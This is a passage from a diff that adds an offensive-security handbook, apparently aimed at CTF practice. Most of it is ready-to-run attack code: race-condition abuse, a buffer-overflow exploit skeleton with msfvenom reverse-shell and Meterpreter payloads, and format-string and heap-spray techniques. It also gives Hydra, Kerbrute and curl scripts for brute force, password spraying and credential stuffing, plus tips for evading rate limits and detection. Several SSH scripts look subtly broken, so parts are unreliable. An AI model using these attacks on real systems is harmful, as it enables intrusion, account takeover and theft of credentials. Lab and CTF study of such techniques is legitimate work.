+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+```
+
+### Session/Token Race Conditions
+
+**Password Reset Race Condition**
+
+```bash
+# Send multiple password reset requests simultaneously
+seq 1 100 | xargs -P 100 -I {} curl -X POST http://target.com/reset \
+    -d "email=victim@example.com"
+```
+
+**Coupon/Voucher Reuse**
+
+```python
+import requests
+from concurrent.futures import ThreadPoolExecutor
+
+def use_coupon(code):
+    return requests.post('http://target.com/apply_coupon', 
+                        data={'code': code},
+                        cookies={'session': 'YOUR_COOKIE'})
+
+# Use same coupon multiple times simultaneously
+with ThreadPoolExecutor(max_workers=50) as executor:
+    futures = [executor.submit(use_coupon, 'COUPON123') for _ in range(50)]
+    results = [f.result() for f in futures]
+```
+
+### Resource Access Race Conditions
+
+**Symlink Race Condition**
+
+```bash
+# Exploit predictable temporary file creation
+#!/bin/bash
+TARGET="/tmp/predictable_file"
+LINK="/path/to/sensitive/file"
+
+while true; do
+    rm -f $TARGET
+    ln -sf $LINK $TARGET
+done &
+
+# Trigger vulnerable application
+./vulnerable_app
+```
+
+### Database Race Conditions
+
+**SQL Injection with Race Condition**
+
+```python
+import requests
+import threading
+
+def exploit():
+    # Exploit timing window in SQL query
+    requests.get('http://target.com/item?id=1 AND SLEEP(5)')
+
+# Multiple concurrent requests
+for _ in range(10):
+    threading.Thread(target=exploit).start()
+```
+
+### Tools for Race Condition Testing
+
+**Turbo Intruder (Burp Suite Extension)**
+
+```python
+# Turbo Intruder script for race conditions
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=10,
+                          requestsPerConnection=1,
+                          pipeline=False)
+    
+    # Queue requests to be sent simultaneously
+    for i in range(50):
+        engine.queue(target.req, gate='race1')
+    
+    # Open gate to send all at once
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+**Race The Web**
+
+```bash
+# Install
+go get github.com/aaronjanse/race-the-web
+
+# Configuration file (config.toml)
+[request]
+method = "POST"
+url = "http://target.com/endpoint"
+body = "param=value"
+count = 50
+```
+
+---
+
+## Memory Corruption Exploits
+
+### Buffer Overflow Fundamentals
+
+**Stack Buffer Overflow Detection**
+
+```python
+# Fuzzing for buffer overflow
+import socket
+
+target = "192.168.1.100"
+port = 9999
+
+buffer = b"A" * 100
+
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.send(buffer)
+        s.close()
+        buffer += b"A" * 100
+        print(f"Sent {len(buffer)} bytes")
+    except:
+        print(f"Crashed at {len(buffer)} bytes")
+        break
+```
+
+### Pattern Generation and Offset Finding
+
+**Using Metasploit Pattern Tools**
+
+```bash
+# Generate unique pattern
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+
+# Find offset from crashed EIP value
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6A413969
+
+# Alternative with pwntools
+python3 -c "from pwn import *; print(cyclic(3000))"
+python3 -c "from pwn import *; print(cyclic_find(0x6a413969))"
+```
+
+### Bad Character Identification
+
+```python
+# Generate bad character string (exclude 0x00)
+badchars = (
+    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
+    # ... continue through 0xff
+)
+
+# Send and compare in debugger (Immunity/GDB)
+```
+
+### Finding JMP ESP Address
+
+**Using mona.py (Immunity Debugger)**
+
+```
+!mona modules  # Find modules without protections
+!mona find -s "\xff\xe4" -m module.dll  # Find JMP ESP (FFE4)
+!mona jmp -r esp -cpb "\x00\x0a\x0d"  # Find JMP ESP excluding bad chars
+```
+
+**Using ROPgadget**
+
+```bash
+ROPgadget --binary vulnerable_binary --only "jmp|call" | grep esp
+```
+
+**Manual with GDB/PEDA**
+
+```bash
+gdb ./vulnerable_binary
+peda> jmpcall esp
+peda> ropgadget
+```
+
+### Exploit Development Workflow
+
+**Basic Stack Overflow Exploit Structure**
+
+```python
+import socket
+
+target = "192.168.1.100"
+port = 9999
+
+offset = 524  # Found via pattern_offset
+jmp_esp = b"\x01\x02\x03\x04"  # Address in little-endian
+nops = b"\x90" * 16
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b "\x00" -f python
+shellcode = b"\xda\xc1\xba\x37\x5b..."  # Your shellcode here
+
+payload = b"A" * offset
+payload += jmp_esp
+payload += nops
+payload += shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.send(payload)
+s.close()
+```
+
+### Shellcode Generation
+
+**msfvenom Common Payloads**
+
+```bash
+# Linux reverse shell
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -f python
+
+# Windows reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x0a\x0d" -f python
+
+# Meterpreter payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -f python -e x86/shikata_ga_nai
+
+# Staged vs stageless
+msfvenom -p windows/shell/reverse_tcp  # Staged (smaller, needs handler)
+msfvenom -p windows/shell_reverse_tcp  # Stageless (larger, standalone)
+```
+
+### Heap Overflow Exploitation
+
+**[Inference]** Heap exploitation techniques vary significantly by allocator implementation and protections. Basic concepts include:
+
+**Use-After-Free Detection**
+
+```c
+// Vulnerable pattern
+char *ptr = malloc(100);
+free(ptr);
+// ... later ...
+strcpy(ptr, "data");  // Use after free
+```
+
+**Heap Spraying (Browser exploitation context)**
+
+```javascript
+// Spray heap with controlled data
+var spray = unescape("%u9090%u9090");  // NOP sled
+while (spray.length < 0x100000) spray += spray;
+
+var memory = new Array();
+for (i = 0; i < 200; i++) {
+    memory[i] = spray + shellcode;
+}
+```
+
+### Format String Vulnerabilities
+
+**Detection**
+
+```bash
+# Test inputs
+%x %x %x %x
+%p %p %p %p
+%s %s %s %s
+AAAA.%x.%x.%x.%x  # Look for 41414141
+```
+
+**Reading Memory**
+
+```bash
+# Read specific addresses
+%<position>$s  # Read string at position
+%<position>$x  # Read hex value at position
+
+# Example: Read address 0x08049000
+\x00\x90\x04\x08%7$s
+```
+
+**Writing Memory**
+
+```bash
+# Write to arbitrary address
+%<value>c%<position>$n  # Write value to position
+
+# Example: Write 0x41414141 to address
+\x00\x90\x04\x08%1094795585c%7$n
+```
+
+### Protection Bypass Techniques
+
+**DEP/NX Bypass via ROP**
+
+```bash
+# Find ROP gadgets
+ROPgadget --binary vulnerable_binary
+
+# Common gadget chains
+ropper --file vulnerable_binary --search "pop rdi"
+```
+
+**ASLR Bypass Information Leak**
+
+```python
+# Leak libc address via format string
+payload = b"%3$p"  # Leak stack address
+# Calculate offset to known libc function
+```
+
+**Stack Canary Bypass**
+
+```python
+# Brute force canary byte-by-byte (forking servers)
+for byte in range(256):
+    payload = b"A" * offset + bytes([byte])
+    # If no crash, byte is correct
+```
+
+### Tools for Memory Corruption
+
+**GDB with Extensions**
+
+```bash
+# PEDA
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+# pwndbg
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg && ./setup.sh
+
+# GEF
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+```
+
+**Pwntools**
+
+```python
+from pwn import *
+
+# Connect to target
+conn = remote('target.com', 1337)
+# or
+conn = process('./vulnerable_binary')
+
+# Interact
+conn.sendline(payload)
+conn.interactive()
+
+# Packing addresses
+address = p32(0x41414141)  # 32-bit
+address = p64(0x4141414141414141)  # 64-bit
+```
+
+**Radare2 for Analysis**
+
+```bash
+r2 -d ./vulnerable_binary
+> aaa  # Analyze all
+> pdf @main  # Disassemble main
+> s main  # Seek to main
+> dc  # Continue execution
+> dr  # Show registers
+```
+
+---
+
+## Important Related Topics
+
+- **Return-Oriented Programming (ROP)** for advanced exploitation bypassing modern protections
+- **Heap Feng Shui** techniques for reliable heap exploitation
+- **Kernel Exploitation** for privilege escalation beyond userland
+- **Browser Exploitation** combining multiple memory corruption primitives
+
+---
+
+# Authentication & Credential Attacks
+
+## Brute Force Attacks
+
+Brute force attacks systematically attempt all possible password combinations within a defined character space. While computationally expensive, brute force remains viable against weak passwords, system accounts, and services lacking rate limiting.
+
+**Attack Surface Identification**
+
+Enumerate authentication endpoints before initiating brute force:
+
+```bash
+# SSH service enumeration
+nmap -p 22 --script ssh-auth-methods target_host
+ssh -v username@target_host
+
+# HTTP Basic Authentication
+curl -v http://target_host/admin/
+
+# FTP anonymous access verification
+ftp target_host
+anonymous
+
+# RDP endpoint detection
+nmap -p 3389 --script rdp-enum-encryption target_host
+```
+
+**Character Space Definition**
+
+Brute force efficiency depends on accurate character space specification:
+
+```bash
+# Lowercase only (26 characters)
+# 8-character password: 26^8 = 208,827,064,576 combinations
+
+# Lowercase + numbers (36 characters)
+# 8-character password: 36^8 = 2,821,109,907,456 combinations
+
+# Full ASCII printable (94 characters)
+# 8-character password: 94^8 = 6,095,689,385,410,816 combinations
+```
+
+**Custom Wordlist Generation**
+
+Create targeted brute force wordlists:
+
+```bash
+# Lowercase alphabetic, 6-8 characters
+crunch 6 8 abcdefghijklmnopqrstuvwxyz > wordlist_lower.txt
+
+# Numbers only, 4-6 characters
+crunch 4 6 0123456789 > wordlist_numbers.txt
+
+# Common patterns (e.g., Password + Year)
+echo "{generating wordlist}"
+for year in {2020..2025}; do
+  echo "Password$year"
+  echo "Passw0rd$year"
+done > wordlist_patterns.txt
+```
+
+Generate complete character set combinations:
+
+```bash
+crunch 8 8 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$" -o complete_wordlist.txt
+```
+
+**SSH Brute Force Attack**
+
+Parallel SSH login attempts using Hydra:
+
+```bash
+hydra -l username -P wordlist.txt ssh://target_host -t 4 -v
+
+# Multiple usernames
+hydra -L userlist.txt -P wordlist.txt ssh://target_host -t 4
+
+# Custom SSH port
+hydra -l username -P wordlist.txt ssh://target_host:2222 -t 4
+```
+
+Using Medusa for SSH:
+
+```bash
+medusa -h target_host -u username -P wordlist.txt -M ssh -t 4 -v
+
+# Against multiple hosts
+medusa -H hostlist.txt -u username -P wordlist.txt -M ssh -t 4
+```
+
+Manual SSH brute force with bash loop:
+
+```bash
+#!/bin/bash
+WORDLIST="wordlist.txt"
+TARGET="target_host"
+USER="username"
+
+while IFS= read -r password; do
+    timeout 5 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$USER@$TARGET" "exit" <<< "$password" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "[+] Success: $password"
+        break
+    else
+        echo "[-] Attempt: $password"
+    fi
+done < "$WORDLIST"
+```
+
+**HTTP Basic Authentication Brute Force**
+
+```bash
+hydra -l admin -P wordlist.txt http-basic://target_host/admin/ -v
+
+# Specific HTTP method
+hydra -l admin -P wordlist.txt http-basic://target_host/admin/ -m GET -v
+
+# Custom HTTP headers
+hydra -l admin -P wordlist.txt http-basic://target_host/admin/ -H "X-Forwarded-For: 127.0.0.1" -v
+```
+
+Using Medusa:
+
+```bash
+medusa -h target_host -u admin -P wordlist.txt -M http -m HTBasic:/admin/ -v
+```
+
+**FTP Brute Force Attack**
+
+```bash
+hydra -l admin -P wordlist.txt ftp://target_host -t 4 -v
+
+medusa -h target_host -u admin -P wordlist.txt -M ftp -t 4 -v
+
+# Manual FTP brute force
+#!/bin/bash
+while IFS= read -r password; do
+    ftp -n -v target_host <<EOF
+user admin
+$password
+quit
+EOF
+done < wordlist.txt
+```
+
+**SMTP Authentication Brute Force**
+
+```bash
+hydra -l user@domain.com -P wordlist.txt smtp://target_host -t 4 -v
+
+hydra -l user@domain.com -P wordlist.txt smtp-enum://target_host -t 4
+```
+
+**RDP Brute Force Attack**
+
+Using Hydra:
+
+```bash
+hydra -l administrator -P wordlist.txt rdp://target_host -t 2 -v
+```
+
+Using Medusa:
+
+```bash
+medusa -h target_host -u administrator -P wordlist.txt -M rdp -t 2 -v
+```
+
+Using ncrack (specialized for RDP):
+
+```bash
+ncrack -u administrator -P wordlist.txt rdp://target_host:3389 -T5
+```
+
+**Rate Limiting and Timing Optimization**
+
+Account for service-imposed delays:
+
+```bash
+# Hydra with delay between attempts
+hydra -l username -P wordlist.txt ssh://target_host -t 1 -W 60 -v
+# -W 60: wait 60 seconds between retries
+
+# Distributed brute force across multiple threads with backoff
+hydra -l username -P wordlist.txt ssh://target_host -t 2 --ssl -o output.txt -v
+```
+
+**Response Analysis and Filtering**
+
+Differentiate between failed attempts and successful authentication:
+
+```bash
+# SSH response parsing
+ssh -o ConnectTimeout=2 username@target_host 2>&1 | grep -E "Permission denied|password expires|Accept password"
+
+# HTTP response status code differentiation
+curl -s -o /dev/null -w "%{http_code}" -u username:password http://target_host/admin/
+
+# 401/403 indicates authentication failure
+# 200 indicates potential success
+```
+
+**Time-Based Attack Optimization**
+
+Account for timing-based login throttling:
+
+```bash
+#!/bin/bash
+# Implement exponential backoff
+WORDLIST="wordlist.txt"
+TARGET="target_host"
+USER="username"
+DELAY=1
+
+while IFS= read -r password; do
+    timeout 5 ssh -o ConnectTimeout=2 "$USER@$TARGET" "exit" <<< "$password" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "[+] Success: $password"
+        exit 0
+    fi
+    sleep $DELAY
+    # Optional: increase delay after failed attempts
+    # DELAY=$((DELAY + 1))
+done < "$WORDLIST"
+```
+
+## Dictionary Attacks
+
+Dictionary attacks leverage pre-compiled wordlists of known passwords, common phrases, and probable combinations, significantly reducing computational overhead compared to pure brute force.
+
+**Wordlist Sources and Curation**
+
+Common wordlist repositories:
+
+```bash
+# SecLists repository
+git clone https://github.com/danielmiessler/SecLists.git
+
+# Rockyou wordlist (most popular)
+# Located in SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+
+# CrackStation wordlist
+# https://crackstation.net/
+
+# Default password lists
+wget https://raw.githubusercontent.com/defaultpasswordlist/defaultpasswordlist.github.io/master/passwords.txt
+```
+
+**Wordlist Processing and Filtering**
+
+Clean and prepare wordlists for target environment:
+
+```bash
+# Remove duplicates
+sort -u wordlist.txt > wordlist_unique.txt
+
+# Filter by password length (8-12 characters)
+awk 'length >= 8 && length <= 12' wordlist.txt > wordlist_filtered.txt
+
+# Extract passwords containing numbers
+grep '[0-9]' wordlist.txt > wordlist_numbers.txt
+
+# Remove common false positives (non-ASCII, URLs)
+grep -v '[[:space:]]' wordlist.txt | grep -v 'http' > wordlist_clean.txt
+
+# Convert to lowercase
+tr '[:upper:]' '[:lower:]' < wordlist.txt > wordlist_lower.txt
+```
+
+**Dictionary Attack Against SSH**
+
+```bash
+hydra -l username -P rockyou.txt ssh://target_host -t 4 -v
+
+# Multiple usernames with dictionary
+hydra -L usernames.txt -P rockyou.txt ssh://target_host -t 4
+
+# Custom wordlist with common password patterns
+cat > custom_wordlist.txt << 'EOF'
+Password1
+Welcome123
+Admin@123
+Letmein
+Qwerty123
+Sunshine
+Trustno1
+Dragon123
+Shadow
+Monster
+EOF
+
+hydra -l admin -P custom_wordlist.txt ssh://target_host -v
+```
+
+**Dictionary Attack Against HTTP Forms**
+
+Target web login forms with dictionary wordlist:
+
+```bash
+# HTTP POST request brute force
+hydra -l admin -P rockyou.txt http-post-form://target_host/login.php:username=^USER^&password=^PASS^:F=incorrect -t 4 -v
+
+# Detailed breakdown:
+# -l admin: username
+# -P rockyou.txt: password wordlist
+# http-post-form: attack method
+# target_host/login.php: target URL
+# username=^USER^&password=^PASS^: POST parameters
+# F=incorrect: failure string (if "incorrect" in response, authentication failed)
+```
+
+**Dictionary Attack Against LDAP**
+
+```bash
+hydra -l username -P rockyou.txt ldap://target_host -t 4 -v
+
+# LDAP with specific base DN
+hydra -l "cn=user,dc=domain,dc=com" -P rockyou.txt ldap://target_host -t 4 -v
+```
+
+**Dictionary Attack Against Database Services**
+
+MySQL:
+
+```bash
+hydra -l root -P rockyou.txt mysql://target_host -t 4 -v
+
+# Specific port
+hydra -l root -P rockyou.txt mysql://target_host:3306 -t 4 -v
+```
+
+PostgreSQL:
+
+```bash
+hydra -l postgres -P rockyou.txt postgres://target_host -t 4 -v
+```
+
+**Hybrid Dictionary Attack**
+
+Combine dictionary words with rules for character substitution and appending:
+
+```bash
+# Using John the Ripper with custom rules
+cat > custom_rules.txt << 'EOF'
+c $1 $2 $3 $4
+c $! $@
+EOF
+
+john --wordlist=dictionary.txt --rules=custom_rules --stdout > hybrid_wordlist.txt
+```
+
+Using hashcat rule engine:
+
+```bash
+# Append numbers 0-9 to each dictionary word
+hashcat -a 6 dictionary.txt "?d" --stdout > hybrid_wordlist.txt
+
+# Prepend and append numbers
+hashcat -a 6 "?d" dictionary.txt "?d" --stdout > hybrid_wordlist.txt
+
+# Common substitutions (l33t speak)
+hashcat -a 6 dictionary.txt "?s" --stdout > hybrid_wordlist.txt
+```
+
+**Domain-Specific Dictionary Generation**
+
+Create wordlists targeting organization-specific terms:
+
+```bash
+# Company name variations
+echo "CompanyName" > org_wordlist.txt
+echo "Company123" >> org_wordlist.txt
+echo "Companyname2024" >> org_wordlist.txt
+
+# Employee names from reconnaissance
+echo "james" >> org_wordlist.txt
+echo "Sarah" >> org_wordlist.txt
+echo "michael.smith" >> org_wordlist.txt
+
+# Combine with generic passwords
+cat rockyou.txt org_wordlist.txt > combined_wordlist.txt
+sort -u combined_wordlist.txt > final_wordlist.txt
+```
+
+**Dictionary Attack Performance Optimization**
+
+Prioritize common passwords:
+
+```bash
+# Reorder wordlist by frequency (if frequency data available)
+# Top 100 passwords first, then alphabetical
+head -100 common_passwords.txt > priority_wordlist.txt
+tail -n +101 common_passwords.txt | sort >> priority_wordlist.txt
+
+# Use compressed wordlists to reduce I/O
+gunzip -c rockyou.txt.gz | hydra -l admin -P - ssh://target_host -t 4 -v
+```
+
+## Password Spraying
+
+Password spraying executes a small set of passwords against many user accounts, avoiding account lockout mechanisms that brute force attacks trigger. This attack is particularly effective in enterprise environments with weak password policies.
+
+**User Account Enumeration (Prerequisite)**
+
+Identify valid usernames before spraying:
+
+```bash
+# LDAP enumeration
+ldapsearch -x -H ldap://target_host -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName
+
+# SMTP VRFY command
+echo "VRFY user1@domain.com" | nc target_host 25
+
+# HTTP response differentiation
+for user in $(cat usernames.txt); do
+    curl -s -o /dev/null -w "%{http_code}" -u "$user:password" http://target_host/admin/
+done
+
+# NetBIOS enumeration
+enum4linux -U target_host | grep user
+```
+
+**Password Selection Strategy**
+
+Effective password spraying requires careful password selection:
+
+```bash
+# Common default passwords (low false positive rate)
+cat > spray_passwords.txt << 'EOF'
+Password123
+Admin@123
+Welcome1
+Letmein
+Qwerty123
+Sunshine
+Spring2024
+EOF
+
+# Seasonal variations
+for season in Spring Summer Fall Winter; do
+    for year in 2023 2024 2025; do
+        echo "$season$year"
+    done
+done > seasonal_passwords.txt
+
+# Company-specific patterns
+echo "CompanyName2024"
+echo "Domain123"
+echo "Acme@2024"
+```
+
+**Distributed Password Spraying Against Active Directory**
+
+Using Kerbrute (Kerberos pre-authentication):
+
+```bash
+# User enumeration via Kerberos
+./kerbrute_linux_amd64 userenum --dc target_host -d domain.com usernames.txt
+
+# Password spraying
+./kerbrute_linux_amd64 passwordspray --dc target_host -d domain.com usernames.txt "Password123"
+
+# Multiple passwords (low volume)
+for password in $(cat spray_passwords.txt); do
+    ./kerbrute_linux_amd64 passwordspray --dc target_host -d domain.com usernames.txt "$password" --delay 0
+done
+```
+
+**LDAP Password Spraying**
+
+```bash
+#!/bin/bash
+USERS_FILE="users.txt"
+PASSWORDS_FILE="passwords.txt"
+TARGET="target_host"
+DOMAIN="domain.com"
+
+while IFS= read -r password; do
+    while IFS= read -r user; do
+        ldapsearch -x -H ldap://$TARGET -D "$user@$DOMAIN" -w "$password" -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName > /dev/null 2>&1
+        if [ $? -eq 0 ]; then
+            echo "[+] Success: $user:$password"
+        fi
+    done < "$USERS_FILE"
+done < "$PASSWORDS_FILE"
+```
+
+**HTTP Form-Based Password Spraying**
+
+```bash
+hydra -L users.txt -P passwords.txt http-post-form://target_host/login.php:username=^USER^&password=^PASS^:F=incorrect -t 2 -W 60 -v
+
+# With request rate limiting to avoid detection
+hydra -L users.txt -P passwords.txt http-post-form://target_host/login.php:username=^USER^&password=^PASS^:F=incorrect -t 1 -W 120 -v
+```
+
+**OWA (Outlook Web Access) Password Spraying**
+
+```bash
+# Using DomainPasswordSpray
+./DomainPasswordSpray.ps1 -UserList users.txt -Password "Password123" -OutFile results.txt
+
+# Manual OWA spray
+#!/bin/bash
+for user in $(cat users.txt); do
+    curl -s -c cookies.txt -b cookies.txt \
+        -d "username=$user@domain.com&password=Password123" \
+        https://owa.domain.com/auth.owa \
+        | grep -q "The user name or password is incorrect" || echo "[+] $user:Password123"
+done
+```
+
+**SSH Password Spraying**
+
+```bash
+# Hydra SSH spray (single password, multiple users)
+hydra -L users.txt -p "Password123" ssh://target_host -t 4 -W 60 -v
+
+# Manual SSH spray with connection reuse
+#!/bin/bash
+PASSWORD="Password123"
+for user in $(cat users.txt); do
+    timeout 5 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$user@target_host" "exit" <<< "$PASSWORD" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "[+] Success: $user:$PASSWORD"
+    fi
+done
+```
+
+**Rate Limiting Evasion**
+
+Distribute attacks across time and infrastructure:
+
+```bash
+# Slow spray with delays
+hydra -L users.txt -P passwords.txt ssh://target_host -t 1 -W 300 -v
+# -W 300: 300 second delay between connection attempts
+
+# Distributed spray across multiple attacker IPs (if infrastructure available)
+for attacker_ip in attacker1 attacker2 attacker3; do
+    ssh $attacker_ip "hydra -L users.txt -P passwords.txt ssh://target_host -t 1 -W 300"
+done
+
+# Randomize attempt timing
+#!/bin/bash
+for user in $(cat users.txt); do
+    sleep $(( RANDOM % 120 + 60 ))
+    timeout 5 ssh -o ConnectTimeout=2 "$user@target_host" "exit" <<< "Password123" 2>/dev/null
+done
+```
+
+**Detection Evasion Techniques**
+
+[Inference] Password spraying detection relies on identifying multiple failed authentication attempts. Evade through:
+
+- **Distributed source IPs**: Use proxies or multiple attacker systems
+- **Low frequency**: Single attempt per user per day
+- **Legitimate traffic patterns**: Mimic normal user behavior (e.g., multiple failed attempts followed by success)
+- **Account rotation**: Avoid targeting same account repeatedly
+
+**Account Lockout Threshold Determination**
+
+Enumerate Active Directory lockout policy before spraying:
+
+```powershell
+# From compromised system with AD access
+net accounts /domain
+Get-ADDefaultDomainPasswordPolicy -Identity domain.com | Select-Object LockoutThreshold, LockoutDuration
+
+# Via LDAP query
+ldapsearch -x -H ldap://target_host -b "CN=Default Domain Policy,CN=System,DC=domain,DC=com" "lockoutThreshold"
+```
+
+[Inference] If lockout threshold is 5 attempts, executing 3 passwords per user distributes risk across accounts.
+
+## Credential Stuffing
+
+Credential stuffing exploits credential dumps from previous breaches, attempting to authenticate using leaked username-password pairs against target systems. This attack assumes password reuse across multiple services.
+
+**Credential Dump Acquisition**
+
+[Unverified] Obtain breached credential lists from public sources (requires careful source verification):
+
+```bash
+# Public breach aggregators (use with caution for legal purposes)
+# HaveIBeenPwned API
+curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/test@example.com" \
+    -H "User-Agent: CTF-Research"
+
+# Credential dumps often available in CTF artifacts or provided datasets
+# Example format:
+# username:password
+# user@email.com:Password123
+# admin:admin123
+```
+
+**Credential Format Normalization**
+
+Process and clean credential dumps:
+
+```bash
+# Extract username:password pairs
+grep -oP '^[^:]+:[^:]+' credentials.txt > normalized_credentials.txt
+
+# Remove duplicates
+sort -u normalized_credentials.txt > credentials_unique.txt
+
+# Filter credentials by domain
+grep "@domain.com" credentials.txt > domain_specific_credentials.txt
+
+# Extract unique usernames
+cut -d: -f1 credentials.txt | sort -u > usernames_from_dump.txt
+
+# Extract unique passwords for reuse analysis
+cut -d: -f2 credentials.txt | sort | uniq -c | sort -rn | head -20
+```
+
+**Credential Stuffing Against SSH**
+
+```bash
+# Parse credentials and attempt SSH login
+#!/bin/bash
+TARGET="target_host"
+
+while IFS=: read -r username password; do
+    timeout 5 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$username@$TARGET" "exit" <<< "$password" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "[+] Success: $username:$password"
+        # Save successful credentials
+        echo "$username:$password" >> successful_creds.txt
+    fi
+done < credentials.txt
+```
+
+Using Hydra:
+
+```bash
+# Convert credentials to Hydra format
+awk -F: '{print $1}' credentials.txt > users.txt
+awk -F: '{print $2}' credentials.txt > passwords.txt
+
+# Execute credential stuffing
+hydra -L users.txt -P passwords.txt ssh://target_host -t 4 -v
+```
+
+**Credential Stuffing Against HTTP Services**
+
+```bash
+#!/bin/bash
+TARGET="http://target_host/login"
+CREDENTIALS="credentials.txt"
+
+while IFS=: read -r username password; do
+    response=$(curl -s -c cookies.txt -b cookies.txt \
+        -d "username=$username&password=$password" \
+        "$TARGET" 2>/dev/null)
+    
+    # Check for success indicators
+    if echo "$response" | grep -q "Welcome\|Dashboard\|Success" || ! echo "$response" | grep -q "incorrect\|failed"; then
+        echo "[+] Success: $username:$password"
+        echo "$username:$password" >> successful_creds.txt
+    fi
+done < "$CREDENTIALS"
+```
+
+**Credential Stuffing Against RDP**
+
+Using Medusa with credential pairs:
+
+```bash
+# Create comma-separated credential file
+awk -F: '{print $1","$2}' credentials.txt > rdp_credentials.txt
+
+medusa -h target_host -C rdp_credentials.txt -M rdp -t 2 -v
+```
+
+**API Authentication Credential Stuffing**
+
+```bash
+#!/bin/bash
+API_ENDPOINT="https://api.target_host/login"
+
+while IFS=: read -r username password; do
+    response=$(curl -s -X POST "$API_ENDPOINT" \
+        -H "Content-Type: application/json" \
+        -d "{\"username\":\"$username\",\"password\":\"$password\"}" 2>/dev/null)
+    
+    # Parse JSON response for auth token
+    if echo "$response" | grep -q "token\|success" && ! echo "$response" | grep -q "error"; then
+        echo "[+] Success: $username:$password"
+        token=$(echo "$response" | grep -oP '"token":"?\K[^"]*' | head -1)
+        echo "$username:$password:$token" >> successful_creds.txt
+    fi
+done < credentials.txt
+```
+
+**Credential Reuse Analysis**
+
+Identify high-value credentials appearing in multiple dumps:
+
+```bash
+# Find credentials appearing in multiple breach datasets
+comm -12 <(sort dump1.txt) <(sort dump2.txt) > common_credentials.txt
+
+# Prioritize password frequency across dumps
+cut -d: -f2 credentials.txt | sort | uniq -c | sort -rn | head -50
+
+# Identify organizational email patterns
+grep -E "@company\.[a-z]+|@[a-z]+\.local" credentials.txt > org_credentials.txt
+```
+
+**Scale Analysis and Targeting**
+
+Determine credential stuffing scope:
+
+```bash
+# Count unique usernames
+wc -l usernames_unique.txt
+
+# Count unique passwords
+wc -l passwords_unique.txt
+
+# Calculate success rate estimate (if partial data available)
+# Successful_attempts / total_attempts * 100
+```
+
+**Detection Evasion in Credential Stuffing**
+
+[Inference] Credential stuffing detection relies on identifying multiple failed authentication attempts from single or distributed sources.
+
+Evasion techniques:
+
+```bash
+# Randomize timing between attempts
+#!/bin/bash
+while IFS=: read -r username password; do
+    sleep $(( RANDOM % 120 + 60 ))
+    # Authentication attempt
+done < credentials.txt
+
+# Distributed attack across proxies
+for proxy in proxy1 proxy2 proxy3; do
+    curl -x $proxy -d "username:password" http://target_host/login
+done
+
+# Rotate User-Agent headers
+curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
+    -d "username:password" http://target_host/login
+```
+
+## Hash Cracking (MD5, SHA, NTLM, Kerberos)
+
+Hash cracking recovers plaintext passwords from cryptographic hashes. Success depends on hash algorithm strength, password entropy, and available computational resources.
+
+**Hash Identification**
+
+Determine hash algorithm from format:
+
+```bash
+# MD5 (128-bit, 32 hex characters)
+# 5f4dcc3b5aa765d61d8327deb882cf99
+
+# SHA-1 (160-bit, 40 hex characters)
+# 356a192b7913b04c54574d18c28d46e6395428ab
+
+# SHA-256 (256-bit, 64 hex characters)
+# e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+# SHA-512 (512-bit, 128 hex characters)
+# cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e
+
+# NTLM (Windows, 32 hex characters, format: username:domain:LM:NTLM)
+# 4d967a2a137cbef6c4352b8a256613dc:4d967a2a137cbef6c4352b8a256613dc
+
+# Kerberos TGT (AS-REP) (format: $krb5asrep$...)
+# $krb5asrep$23$user@domain.com:hash_data
+
+# bcrypt (variable length, format: $2a$cost$salt$hash)
+# $2a$10$SlFQSdhFubMQUqkR5nKhPuYvMHMZvfPHYEbl0iMqmT2uVLT0O7y1K
+```
+
+Using hash-identifier tool:
+
+```bash
+hash-identifier
+# Interactive tool for hash type determination
+
+# Automated detection
+echo "5f4dcc3b5aa765d61d8327deb882cf99" | hash-identifier
+```
+
+**MD5 Hash Cracking**
+
+[Inference] MD5 is cryptographically broken and should not be used for password storage. However, MD5 remains prevalent in legacy systems.
+
+```bash
+# Rainbow table lookup (if hash in precomputed tables)
+# Online services like md5online.com, crackstation.net (for CTF/educational use)
+
+# Local dictionary attack
+john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
+
